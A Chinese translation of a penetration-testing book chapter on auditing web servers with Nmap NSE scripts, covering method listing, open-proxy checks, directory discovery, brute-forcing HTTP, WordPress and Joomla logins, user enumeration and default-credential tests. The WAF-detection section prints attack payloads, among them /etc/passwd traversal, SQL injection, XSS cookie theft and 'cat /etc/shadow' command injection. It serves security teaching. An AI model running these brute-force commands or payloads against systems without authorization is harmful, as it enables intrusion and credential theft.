# 第四章。审核 Web 服务器

### 注意

本章向您展示了如何做一些在许多情况下可能是非法、不道德、违反服务条款或不明智的事情。它在这里提供是为了给您提供可能有用的信息，以保护自己免受威胁，并使自己的系统更安全。在遵循这些说明之前，请确保您站在法律和道德的一边...善用您的力量！

在本章中，我们将涵盖：

+   列出支持的 HTTP 方法

+   检查 HTTP 代理是否开放

+   在各种 Web 服务器上发现有趣的文件和目录

+   暴力破解 HTTP 身份验证

+   滥用 mod_userdir 列举用户帐户

+   测试 Web 应用程序中的默认凭据

+   暴力破解 WordPress 安装的密码审核

+   暴力破解 Joomla！安装的密码审核

+   检测 Web 应用程序防火墙

+   检测可能的 XST 漏洞

+   检测 Web 应用程序中的跨站脚本漏洞

+   在 Web 应用程序中查找 SQL 注入漏洞

+   检测易受 slowloris 拒绝服务攻击的 Web 服务器

# 介绍

**超文本传输协议（HTTP）**可以说是当今最流行的协议之一。Web 服务器已经从提供静态页面转变为处理具有实际用户交互的复杂 Web 应用程序。这打开了一个门，使得可能存在有害用户输入，可能改变应用程序的逻辑以执行意外操作。现代 Web 开发框架允许几乎任何具有编程知识的人在几分钟内制作 Web 应用程序，但这也导致了互联网上易受攻击应用程序的增加。Nmap 脚本引擎的可用 HTTP 脚本数量迅速增长，Nmap 变成了一款宝贵的 Web 扫描器，帮助渗透测试人员以自动化方式执行许多繁琐的手动检查。它不仅可以用于查找易受攻击的 Web 应用程序或检测错误的配置设置，而且由于新的蜘蛛库，Nmap 甚至可以爬行 Web 服务器，寻找各种有趣的信息。

本章介绍了使用 Nmap 对 Web 服务器进行审核，从自动化配置检查到利用易受攻击的 Web 应用程序。我将介绍我在过去一年中开发的一些 NSE 脚本，以及我在 Websec 进行 Web 渗透测试时每天使用的脚本。本章涵盖了检测数据包过滤系统、暴力破解密码审核、文件和目录发现以及漏洞利用等任务。

# 列出支持的 HTTP 方法

Web 服务器根据其配置和软件支持不同的 HTTP 方法，其中一些在特定条件下可能是危险的。渗透测试人员需要一种快速列出可用方法的方法。NSE 脚本`http-methods`不仅允许他们列出这些潜在危险的方法，还允许他们进行测试。

本教程向您展示如何使用 Nmap 枚举 Web 服务器支持的所有 HTTP 方法。

## 如何做...

打开终端并输入以下命令：

```
$ nmap -p80,443 --script http-methods scanme.nmap.org

```

对于在端口`80`或`443`上检测到的每个 Web 服务器，都显示了结果：

```
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.11s latency).
PORT    STATE  SERVICE
80/tcp  open   http
|_http-methods: GET HEAD POST OPTIONS
443/tcp closed https

```

## 工作原理...

参数`-p80,443 --script http-methods`使 Nmap 在发现端口 80 或 443（`-p80,443`）的 Web 服务器时启动`http-methods`脚本。NSE 脚本`hhttp-methods`由 Bernd Stroessenreuther 提交，并使用 HTTP 方法`OPTIONS`尝试列出 Web 服务器支持的所有方法。

`OPTIONS`在 Web 服务器中用于通知客户端其支持的方法。请记住，此方法不考虑配置或防火墙规则，并且通过`OPTIONS`列出的方法并不一定意味着它对您是可访问的。

## 还有更多...

要单独检查`OPTIONS`返回的方法的状态代码响应，请使用脚本参数`http-methods.retest`：

```
# nmap -p80,443 --script http-methods --script-args http-methods.retest scanme.nmap.org
Nmap scan report for scanme.nmap.org (74.207.244.221)
Host is up (0.14s latency).
PORT    STATE  SERVICE
80/tcp  open   http
| http-methods: GET HEAD POST OPTIONS
| GET / -> HTTP/1.1 200 OK
|
| HEAD / -> HTTP/1.1 200 OK
|
| POST / -> HTTP/1.1 200 OK
|
|_OPTIONS / -> HTTP/1.1 200 OK
443/tcp closed https

```

默认情况下，脚本`http-methods`使用根文件夹作为基本路径（`/`）。如果要设置不同的基本路径，请设置参数`http-methods.url-path`：

```
# nmap -p80,443 --script http-methods --script-args http-methods.url-path=/mypath/ scanme.nmap.org

```

### 有趣的 HTTP 方法

`TRACE`，`CONNECT`，`PUT`和`DELETE`这些 HTTP 方法可能存在安全风险，如果 Web 服务器或应用程序支持，需要进行彻底测试。

`TRACE`使应用程序容易受到**跨站点跟踪（XST）**攻击的影响，并可能导致攻击者访问标记为`httpOnly`的 cookie。`CONNECT`方法可能允许 Web 服务器用作未经授权的 Web 代理。`PUT`和`DELETE`方法具有更改文件夹内容的能力，如果权限设置不正确，显然会被滥用。

您可以在[`www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29`](http://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29)了解与每种方法相关的常见风险。

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 默认的 HTTP 用户代理的请求。您可以通过设置参数`http.useragent`来使用不同的 HTTP 用户代理：

```
$ nmap -p80 --script http-methods --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 流水线

一些 Web 服务器允许将多个 HTTP 请求封装在单个数据包中。这可能会加快执行 NSE HTTP 脚本，并建议在 Web 服务器支持的情况下使用。默认情况下，HTTP 库尝试对 40 个请求进行流水线处理，并根据`Keep-Alive`标头根据流量条件自动调整请求的数量。

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到流水线的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *滥用 mod_userdir 列举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 检查 HTTP 代理是否开放

HTTP 代理用于通过它们的地址发出请求，因此可以隐藏我们的真实 IP 地址。如果您是需要保持网络安全的系统管理员，或者是伪装自己真实来源的攻击者，检测它们是很重要的。

此配方向您展示了如何使用 Nmap 检测开放的 HTTP 代理。

## 如何操作...

打开终端并输入以下命令：

```
$ nmap --script http-open-proxy -p8080 <target>

```

结果包括成功测试的 HTTP 方法：

```
PORT     STATE SERVICE
8080/tcp open  http-proxy
|  proxy-open-http: Potentially OPEN proxy.
|_ Methods successfully tested: GET HEAD CONNECT

```

## 它是如何工作的...

我们使用参数`--script http-open-proxy -p8080`来启动 NSE 脚本`http-open-proxy`，如果在端口`8080`上发现运行的 Web 服务器，这是 HTTP 代理的常见端口。

NSE 脚本`http-open-proxy`由 Arturo“Buanzo”Busleiman 提交，它旨在检测开放代理，正如其名称所示。默认情况下，它请求[google.com](http://google.com)，[wikipedia.org](http://wikipedia.org)和[computerhistory.org](http://computerhistory.org)，并寻找已知的文本模式，以确定目标 Web 服务器上是否运行着开放的 HTTP 代理。

## 还有更多...

您可以通过使用脚本参数`http-open-proxy.url`和`http-open-proxy.pattern`请求不同的 URL，并指定在连接成功时将返回的模式：

```
$ nmap --script http-open-proxy –script-args http-open-proxy.url=http://whatsmyip.org,http-open-proxy.pattern="Your IP address is" -p8080 <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 默认的 HTTP 用户代理的请求。您可以通过设置参数`http.useragent`来使用不同的 HTTP 用户代理：

```
$ nmap -p80 --script http-trace --script-args http.useragent="Mozilla 42" <target>

```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *暴力破解 HTTP 身份验证*配方

+   *滥用 mod_userdir 枚举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *暴力破解密码审计 WordPress 安装*配方

+   *暴力破解密码审计 Joomla！安装*配方

+   *在 Web 应用程序中查找 SQL 注入漏洞*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 在各种 Web 服务器上发现有趣的文件和目录

渗透测试中的常见任务之一是无法手动完成的文件和目录发现。有几种工具专门用于此任务，但 Nmap 真正闪耀的是其强大的数据库，其中包括有趣的文件，如 README，数据库转储和遗忘的配置备份；常见目录，如管理面板或未受保护的文件上传者；甚至攻击有效载荷，以利用常见的易受攻击的 Web 应用程序中的目录遍历。

这个配方将向您展示如何使用 Nmap 进行 Web 扫描，以发现有趣的文件，目录，甚至是存在漏洞的 Web 应用程序。

## 如何操作...

打开您的终端并输入以下命令：

```
$ nmap --script http-enum -p80 <target>

```

结果将包括所有有趣的文件，目录和应用程序：

```
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /blog/: Blog
|   /test.php: Test page
|   /robots.txt: Robots file
|   /css/cake.generic.css: CakePHP application
|_  /img/cake.icon.png: CakePHP application

```

## 它是如何工作的...

使用参数`-p80 --script http-enum`告诉 Nmap 在端口 80 上找到 Web 服务器时启动脚本`http-enum`。脚本`http-enum`最初是由 Ron Bowes 提交的，其主要目的是进行目录发现，但社区一直在添加新的指纹以包括其他有趣的文件，如版本文件，README 和遗忘的数据库备份。我还添加了超过 150 个条目，用于识别过去两年中存在漏洞的 Web 应用程序，新条目不断添加。

```
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /crossdomain.xml: Adobe Flash crossdomain policy

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /administrator/: Possible admin folder
|   /administrator/index.php: Possible admin folder
|   /home.html: Possible admin folder
|   /test/: Test page
|   /logs/: Logs
|_  /robots.txt: Robots file

```

## 还有更多...

指纹存储在`/nselib/data/`中的文件`http-fingerprints.lua`中，它们实际上是 LUA 表。一个条目看起来像下面这样：

```
table.insert(fingerprints, {
	category='cms',
	probes={
		{path='/changelog.txt'},
		{path='/tinymce/changelog.txt'},
	},
	matches={
		{match='Version (.-) ', output='Version \\1'},
		{output='Interesting, a changelog.'}
	}
})
```

您可以向此文件添加自己的条目，或者使用参数`http-enum.fingerprintfile`来使用不同的指纹文件：

```
$ nmap --script http-enum --script-args http-enum.fingerprintfile=./myfingerprints.txt -p80 <target>

```

默认情况下，`http-enum`使用根目录作为基本路径。要设置不同的基本路径，请使用脚本参数`http-enum.basepath`：

```
$ nmap --script http-enum http-enum.basepath=/web/ -p80 <target>

```

要显示所有返回可能指示存在页面的状态代码的条目，请使用脚本参数`http-enum.displayall`：

```
$ nmap --script http-enum http-enum.displayall -p80 <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的 HTTP 用户代理：

```
$ nmap -p80 --script http-enum --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 流水线处理

一些 Web 服务器允许在单个数据包中封装多个 HTTP 请求。这可能加快执行 NSE HTTP 脚本，并建议在 Web 服务器支持时使用。HTTP 库默认尝试对 40 个请求进行流水线处理，并根据`Keep-Alive`标头根据流量条件自动调整该数字。

```
$ nmap -p80 --script http-enum --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到流水线的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *暴力破解 HTTP 身份验证*配方

+   *滥用 mod_userdir 枚举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *暴力破解密码审计 WordPress 安装*配方

+   *暴力破解密码审计 Joomla！安装*配方

# 暴力破解 HTTP 身份验证

许多家用路由器，IP 网络摄像头，甚至 Web 应用程序仍然依赖 HTTP 身份验证，渗透测试人员需要尝试使用弱密码字典来确保系统或用户帐户的安全。现在，由于 NSE 脚本`http-brute`，我们可以对 HTTPAuth 受保护的资源执行强大的字典攻击。

此配方展示了如何对使用 HTTP 身份验证的 Web 服务器执行暴力破解密码审计。

## 如何做...

使用以下 Nmap 命令对受 HTTP 基本身份验证保护的资源执行暴力破解密码审计：

```
$ nmap -p80 --script http-brute –script-args http-brute.path=/admin/ <target>

```

结果包含找到的所有有效帐户：

```
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
| http-brute: 
|   Accounts
|     admin:secret => Valid credentials
|   Statistics
|_    Perfomed 603 guesses in 7 seconds, average tps: 86

```

## 它是如何工作的...

参数`-p80 --script http-brute`告诉 Nmap 在端口 80 上运行的 Web 服务器上启动`http-brute`脚本。此脚本最初由 Patrik Karlsson 提交，并且是为了对受 HTTP 基本身份验证保护的 URI 进行字典攻击而创建的。

脚本`http-brute`默认使用位于`/nselib/data/`的文件`usernames.lst`和`passwords.lst`尝试每个用户的每个密码，以便找到有效帐户。

## 还有更多...

脚本`http-brute`依赖于 NSE 库`unpwdb`和`brute`。这些库有几个脚本参数，可用于调整暴力破解密码的审计。

要使用不同的用户名和密码列表，请设置参数`userdb`和`passdb`：

```
$ nmap -p80 --script http-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt <target>

```

要在找到一个有效帐户后退出，请使用参数`brute.firstOnly`：

```
$ nmap -p80 --script http-brute --script-args brute.firstOnly <target>

```

默认情况下，`http-brute`使用 Nmap 的时间模板来设置以下超时限制：

+   -T3，T2，T1：10 分钟

+   -T4：5 分钟

+   -T5：3 分钟

要设置不同的超时限制，请使用参数`unpwd.timelimit`。要无限期运行，请将其设置为`0`：

```
$ nmap -p80 --script http-brute --script-args unpwdb.timelimit=0 <target>
$ nmap -p80 --script http-brute --script-args unpwdb.timelimit=60m <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-brute --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 流水线

一些 Web 服务器允许将多个 HTTP 请求封装在单个数据包中。这可能加快执行 NSE HTTP 脚本，并建议在 Web 服务器支持的情况下使用。默认情况下，HTTP 库尝试对 40 个请求进行流水线处理，并根据`Keep-Alive`头部根据流量情况自动调整该数字。

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

此外，您可以使用参数`http.max-pipeline`来设置要添加到流水线中的 HTTP 请求的最大数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

### 暴力模式

暴力库支持不同的模式，可以改变攻击中使用的组合。可用的模式包括：

+   `user`：在此模式下，对于`userdb`中列出的每个用户，将尝试`passdb`中的每个密码。

```
    $ nmap --script http-brute --script-args brute.mode=user <target>

    ```

+   `pass`：在此模式下，对于`passdb`中列出的每个密码，将尝试`usedb`中的每个用户。

```
    $ nmap --script http-brute --script-args brute.mode=pass <target>

    ```

+   `creds`：此模式需要额外的参数`brute.credfile`。

```
    $ nmap --script http-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>

    ```

## 另请参阅

+   *检测可能的 XST 漏洞*配方

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *滥用 mod_userdir 列举用户帐户*配方

+   *测试 Web 应用程序中的默认凭据*配方

+   *暴力破解密码审计 WordPress 安装*配方

+   *暴力破解密码审计 Joomla！安装*配方

+   *检测易受 slowloris 拒绝服务攻击的 Web 服务器*配方

# 滥用 mod_userdir 列举用户帐户

Apache 的模块`UserDir`通过使用`/~username/`的 URI 语法提供对用户目录的访问。使用 Nmap，我们可以执行字典攻击并确定 Web 服务器上有效用户名的列表。

这个配方向您展示了如何使用 Nmap 对 Apache Web 服务器中启用`mod_userdir`的用户帐户进行暴力破解攻击。

## 如何做...

要尝试在启用`mod_userdir`的 Web 服务器中枚举有效用户，请使用 Nmap 和这些参数：

```
$ nmap -p80 --script http-userdir-enum <target>

```

找到的所有用户名将包含在结果中：

```
PORT   STATE SERVICE
80/tcp open  http
|_http-userdir-enum: Potential Users: root, web, test

```

## 它是如何工作的...

参数`-p80 --script http-userdir-enum`如果在端口 80（`-p80`）上找到 Web 服务器，则启动 NSE 脚本`http-userdir-enum`。带有`mod_userdir`的 Apache Web 服务器允许通过使用 URI（例如[`domain.com/~root/`](http://domain.com/~root/)）访问用户目录，此脚本帮助我们执行字典攻击以枚举有效用户。

首先，脚本查询一个不存在的目录以记录无效页面的状态响应。然后尝试字典文件中的每个单词，测试 URI 并寻找 HTTP 状态码 200 或 403，这将表明有效的用户名。

## 还有更多...

脚本`http-userdir-enum`默认使用位于`/nselib/data/`的单词列表`usernames.lst`，但您可以通过设置参数`userdir.users`来使用不同的文件，如下面的命令所示：

```
$ nmap -p80 --script http-userdir-enum --script-args userdir.users=./users.txt <target>
PORT   STATE SERVICE
80/tcp open  http
|_http-userdir-enum: Potential Users: john, carlos

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-brute --script-args http.useragent="Mozilla 42" <target>

```

### HTTP 管线

一些 Web 服务器允许在单个数据包中封装多个 HTTP 请求。这可能加快 NSE HTTP 脚本的执行速度，如果 Web 服务器支持，建议使用它。默认情况下，HTTP 库尝试将 40 个请求进行管线处理，并根据`Keep-Alive`标头根据流量条件自动调整该数字。

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

另外，您可以使用参数`http.max-pipeline`来设置要添加到管道中的最大 HTTP 请求数量。如果设置了脚本参数`http.pipeline`，则将忽略此参数：

```
$.nmap -p80 --script http-methods --script-args http.max-pipeline=10 <target>

```

## 另请参阅

+   *在各种 Web 服务器上发现有趣的文件和目录*配方

+   *检测 Web 应用程序防火墙*配方

+   *Brute forcing HTTP authentication*配方

+   *在 Web 应用程序中测试默认凭据*配方

+   *Brute-force 密码审计 WordPress 安装*配方

+   *Brute-force 密码审计 Joomla！安装*配方

# 在 Web 应用程序中测试默认凭据

在 Web 应用程序和设备中经常忘记默认凭据。 Nmap 的 NSE 脚本`http-default-accounts`自动化了测试流行 Web 应用程序（例如 Apache Tomcat Manager，Cacti 甚至家用路由器的 Web 管理界面）的默认凭据的过程。

此配方向您展示了如何使用 Nmap 自动测试多个 Web 应用程序中的默认凭据访问。

## 如何做...

要自动测试支持的应用程序中的默认凭据访问，请使用以下 Nmap 命令：

```
$ nmap -p80 --script http-default-accounts <target>

```

结果将指示应用程序和默认凭据（如果成功）：

```
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack
|_http-default-accounts: [Cacti] credentials found -> admin:admin Path:/cacti/

```

## 工作原理...

如果在端口 80（`-p80`）上找到 Web 服务器，则启动 NSE 脚本`http-default-accounts`（`--script http-default-accounts`）。

我开发了这个 NSE 脚本，以节省在 Web 渗透测试期间的时间，通过自动检查系统管理员是否忘记在其系统中更改任何默认密码。我已经为流行服务包含了一些指纹，但是通过支持更多服务，这个脚本可以得到很大的改进。如果您可以访问通常使用默认凭据访问的服务，我鼓励您向其数据库提交新的指纹。到目前为止，支持的服务有：

+   仙人掌

+   Apache Tomcat

+   Apache Axis2

+   Arris 2307 路由器

+   思科 2811 路由器

该脚本通过查看已知路径并使用存储的默认凭据启动登录例程来检测 Web 应用程序。它依赖于位于`/nselib/data/http-default-accounts.nse`的指纹文件。条目是 LUA 表，看起来像下面这样：

```
table.insert(fingerprints, {
  name = "Apache Tomcat",
  category = "web",
  paths = {
    {path = "/manager/html/"},
    {path = "/tomcat/manager/html/"}
  },
  login_combos = {
    {username = "tomcat", password = "tomcat"},
    {username = "admin", password = "admin"}
  },
  login_check = function (host, port, path, user, pass)
    return try_http_basic_login(host, port, path, user, pass)
  end
})
```

每个指纹条目必须具有以下字段：

+   `name`：此字段指定描述性服务名称。

+   `category`：此字段指定较不侵入式扫描所需的类别。

+   `login_combos`：此字段指定服务使用的默认凭据的 LUA 表。

+   `paths`：此字段指定服务通常被发现的路径的 LUA 表。

+   `login_check`：此字段指定 Web 服务的登录例程。

## 还有更多...

为了减少侵入式扫描，可以使用脚本参数`http-default-accounts.category`按类别过滤探针：

```
$ nmap -p80 --script http-default-accounts --script-args http-default-accounts.category=routers <target>

```

可用的类别有：

+   `web`：此类别管理 Web 应用程序

+   `router`：此类别管理路由器的接口

+   `voip`：此类别管理 VOIP 设备

+   `security`：此类别管理与安全相关的软件

此脚本默认使用根文件夹作为基本路径，但您可以使用参数`http-default-accounts.basepath`设置不同的路径：

```
$ nmap -p80 --script http-default-accounts --script-args http-default-accounts.basepath=/web/ <target>

```

默认指纹文件位于`/nselib/data/http-default-accounts-fingerprints.lua`，但您可以通过指定参数`http-default-accounts.fingerprintfile`来使用不同的文件：

```
$ nmap -p80 --script http-default-accounts --script-args http-default-accounts.fingerprintfile=./more-signatures.txt <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-brute --script-args http.useragent="Mozilla 42" <target>

```

## 另请参阅

+   检测可能的 XST 漏洞食谱

+   在各种 Web 服务器上发现有趣的文件和目录的食谱

+   检测 Web 应用防火墙食谱

+   暴力破解 HTTP 身份验证食谱

+   滥用 mod_userdir 列举用户帐户的食谱

+   暴力破解密码审计 WordPress 安装食谱

+   暴力破解密码审计 Joomla！安装食谱

+   在 Web 应用程序中查找 SQL 注入漏洞的食谱

# 暴力破解密码审计 WordPress 安装

WordPress 是一个广为人知的**CMS**（**内容管理系统**），在许多行业中都有使用。Nmap 现在包括自己的 NSE 脚本，以帮助渗透测试人员发动字典攻击，并找到使用弱密码的帐户，这可能会危及应用程序的完整性。

此食谱显示了如何对 WordPress 安装执行暴力破解密码审计。

## 如何做...

要查找 WordPress 安装中具有弱密码的帐户，请使用以下 Nmap 命令：

```
$ nmap -p80 --script http-wordpress-brute <target>

```

找到的所有有效帐户将显示在结果中：

```
PORT     STATE SERVICE REASON
80/tcp   open  http    syn-ack
| http-wordpress-brute:
|   Accounts
|     papa:a1b2c3d4 => Login correct
|   Statistics
|_    Perfomed 360 guesses in 17 seconds, average tps: 6

```

## 它是如何工作的...

参数`-p80 –script http-wordpress-brute`在端口 80（`-p80`）上找到 Web 服务器时启动 NSE 脚本`http-wordpress-brute`。我开发了这个脚本，以免在对 WordPress 安装使用`http-brute`时设置 WordPress URI 和用户名和密码的 HTML 变量名称。

此脚本使用以下默认变量：

+   `uri`：`/wp-login.php`

+   `uservar`：`log`

+   `passvar`：`pwd`

## 还有更多...

要设置线程数，请使用脚本参数`http-wordpress-brute.threads`：

```
$ nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.threads=5 <target>

```

如果服务器有虚拟主机，请使用参数`http-wordpress-brute.hostname`设置主机字段：

```
$ nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.hostname="ahostname.wordpress.com" <target>

```

要设置不同的登录 URI，请使用参数`http-wordpress-brute.uri`：

```
$ nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.uri="/hidden-wp-login.php" <target>

```

要更改存储用户名和密码的`POST`变量的名称，请设置参数`http-wordpress-brute.uservar`和`http-wordpress-brute.passvar`：

```
$ nmap -p80 --script http-wordpress-brute --script-args http-wordpress-brute.uservar=usuario,http-wordpress-brute.passvar=pasguord <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-wordpress-brute --script-args http.useragent="Mozilla 42" <target>

```

### Brute 模式

Brute 库支持改变攻击中使用的组合的不同模式。可用的模式有：

+   `user`：在此模式中，对于`userdb`中列出的每个用户，将尝试`passdb`中的每个密码

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=user <target>

    ```

+   `pass`：在此模式中，对于`passdb`中列出的每个密码，将尝试`usedb`中的每个用户

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=pass <target>

    ```

+   `creds`：此模式需要额外的参数`brute.credfile`

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>

    ```

## 另请参阅

+   检测可能的 XST 漏洞食谱

+   在各种 Web 服务器上发现有趣的文件和目录的食谱

+   检测 Web 应用防火墙食谱

+   暴力破解 HTTP 身份验证食谱

+   滥用 mod_userdir 列举用户帐户的食谱

+   *Testing default credentials in web applications* 配方

+   *Brute-force password auditing Joomla! installations* 配方

+   *Finding SQL injection vulnerabilities in web applications* 配方

+   *Detecting web servers vulnerable to slowloris denial of service attacks* 配方

# Brute-force password auditing Joomla! installations

Joomla！是一个非常流行的 CMS，用于许多不同的目的，包括电子商务。检测具有弱密码的用户帐户是渗透测试人员的常见任务，Nmap 通过使用 NSE 脚本`http-joomla-brute`来帮助实现这一点。

此配方展示了如何对 Joomla！安装进行暴力密码审核。

## 如何做...

打开终端并输入以下命令：

```
$ nmap -p80 --script http-joomla-brute <target>

```

找到的所有有效帐户将被返回：

```
PORT     STATE SERVICE REASON
80/tcp open  http    syn-ack
| http-joomla-brute:
|   Accounts
|     king:kong => Login correct
|   Statistics
|_    Perfomed 799 guesses in 501 seconds, average tps: 0

```

## 工作原理...

参数`-p80 –script http-joomla-brute`在端口 80（`-p80`）上发现 Web 服务器时启动 NSE 脚本`http-joomla-brute`。我开发了这个脚本来对 Joomla！安装进行暴力密码审核。

脚本`http-joomla-brute`使用以下默认变量：

+   `uri`：`/administrator/index.php`

+   `uservar`：`用户名`

+   `passvar`：`密码`

## 还有更多...

使用以下命令设置参数`http-joomla-brute.threads`来设置线程数：

```
$ nmap -p80 --script http-joomla-brute --script-args http-joomla-brute.threads=5 <target>

```

要在 HTTP 请求中设置`Host`字段，请使用以下命令设置脚本参数`http-joomla-brute.hostname`：

```
$ nmap -p80 --script http-joomla-brute --script-args http-joomla-brute.hostname="hostname.com" <target>

```

通过使用以下命令指定参数`http-joomla-brute.uri`来设置不同的登录 URI：

```
$ nmap -p80 --script http-joomla-brute --script-args http-joomla-brute.uri="/joomla/admin/login.php" <target>

```

要更改存储用户名和密码的`POST`变量的名称，请使用以下命令设置参数`http-joomla-brute.uservar`和`http-joomla-brute.passvar`：

```
$ nmap -p80 --script http-joomla-brute --script-args http-joomla-brute.uservar=usuario,http-joomla-brute.passvar=pasguord <target>

```

### HTTP 用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理发出的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-wordpress-brute --script-args http.useragent="Mozilla 42" <target>

```

### Brute 模式

Brute 库支持不同的模式，可以改变攻击中使用的组合。可用的模式有：

+   `user`：在此模式下，将尝试`userdb`中列出的每个用户的每个密码

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=user <target>

    ```

+   `pass`：在此模式下，将尝试`passdb`中列出的每个密码的每个用户

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=pass <target>

    ```

+   `creds`：此模式需要额外的参数`brute.credfile`

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>

    ```

## 另请参阅

+   *Detecting possible XST vulnerabilities* 配方

+   在各种网络服务器上发现有趣文件和目录的配方

+   *Brute forcing HTTP authentication* 配方

+   *Abusing mod_userdir to enumerate user accounts* 配方

+   *Testing default credentials in web applications* 配方

+   *Brute-force password auditing WordPress installations* 配方

+   *Detecting web servers vulnerable to slowloris denial of service attacks* 配方

# 检测 Web 应用防火墙

Web 服务器通常受到数据包过滤系统的保护，该系统会丢弃或重定向可疑的恶意数据包。Web 渗透测试人员受益于知道在他们和目标应用程序之间有一个流量过滤系统。如果是这种情况，他们可以尝试更罕见或隐秘的技术来尝试绕过 Web 应用防火墙（WAF）或入侵防御系统（IPS）。这也有助于他们确定漏洞在当前环境中是否实际可利用。

此配方演示了如何使用 Nmap 检测数据包过滤系统，如 Web 应用防火墙或入侵防御系统。

## 如何做...

检测 Web 应用防火墙或入侵防御系统：

```
$ nmap -p80 --script http-waf-detect <target>

```

脚本`http-waf-detect`将告诉您是否检测到了数据包过滤系统：

```
PORT   STATE SERVICE
80/tcp open  http
|_http-waf-detect: IDS/IPS/WAF detected

```

## 工作原理...

参数`-p80 --script http-waf-detect`在发现运行在端口 80 上的 Web 服务器时启动 NSE 脚本`http-waf-detect`。我开发了`http-waf-detect`来确定是否通过 Web 应用防火墙（WAF）或入侵防御系统（IPS）过滤了带有恶意有效负载的 HTTP 请求。

该脚本通过保存安全的 HTTP`GET`请求的状态码和可选的页面主体，并将其与包含最常见 Web 应用程序漏洞的攻击载荷的请求进行比较。因为每个恶意载荷都存储在一个奇数变量名中，所以它几乎不可能被 Web 应用程序使用，只有数据包过滤系统会做出反应并改变任何返回的状态码，可能会收到 HTTP 状态码 403（禁止）或页面内容。

## 还有更多...

要检测响应主体的变化，请使用参数`http-waf-detect.detectBodyChanges`。我建议在处理动态内容较少的页面时启用它：

```
$ nmap -p80 --script http-waf-detect --script-args="http-waf-detect.detectBodyChanges" <target>

```

要包含更多的攻击载荷，请使用脚本参数`http-waf-detect.aggro`。这种模式会生成更多的 HTTP 请求，但也可能触发更多的产品：

```
$ nmap -p80 --script http-waf-detect --script-args="http-waf-detect.aggro" <target>
Initiating NSE at 23:03
NSE: http-waf-detect: Requesting URI /abc.php
NSE: Final http cache size (1160 bytes) of max size of 1000000
NSE: Probing with payload:?p4yl04d=../../../../../../../../../../../../../../../../../etc/passwd
NSE: Probing with payload:?p4yl04d2=1%20UNION%20ALL%20SELECT%201,2,3,table_name%20FROM%20information_schema.tables
NSE: Probing with payload:?p4yl04d3=<script>alert(document.cookie)</script>
NSE: Probing with payload:?p4yl04d=cat%20/etc/shadow
NSE: Probing with payload:?p4yl04d=id;uname%20-a
NSE: Probing with payload:?p4yl04d=<?php%20phpinfo();%20?>
NSE: Probing with payload:?p4yl04d='%20OR%20'A'='A
NSE: Probing with payload:?p4yl04d=http://google.com
